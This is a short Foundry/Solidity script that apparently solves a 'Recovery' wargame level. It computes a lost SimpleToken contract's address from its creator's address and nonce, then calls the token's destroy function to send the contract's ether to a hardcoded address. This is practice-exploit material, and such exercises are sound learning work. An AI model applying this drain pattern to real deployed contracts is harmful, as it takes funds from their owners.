// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

contract RecoveryScript is Script {
    Recovery public recovery;
    Hack public hack;
    SimpleToken public simpleToken;

    function run() external {
        recovery = Recovery(0x7f03549A1251d13A9820D6b343a10E25550f95A6);
        pwn();
    }

    function pwn() public {
        vm.startBroadcast();
        hack = new Hack(0x7f03549A1251d13A9820D6b343a10E25550f95A6);
        address simpleTokenAddress = hack.getSimpleTokenAddress();
        simpleToken = SimpleToken(payable(simpleTokenAddress));
        simpleToken.destroy(
            payable(0xb99822596ADa5fF795af305D98818E9ee4650C63)
        );
        vm.stopBroadcast();
    }
}

//https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
// Info on how we get the simpleTokenAddress from the recovery contract address which creates the SimpleToken

contract Hack {
    address public recoveryContractAddress;

    constructor(address _recoveryContractAddress) {
        recoveryContractAddress = _recoveryContractAddress;
    }

    function getSimpleTokenAddress() public view returns (address) {
        // See the link above to see how it is calculated
        address simpleTokenAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            recoveryContractAddress,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        return simpleTokenAddress;
    }
}
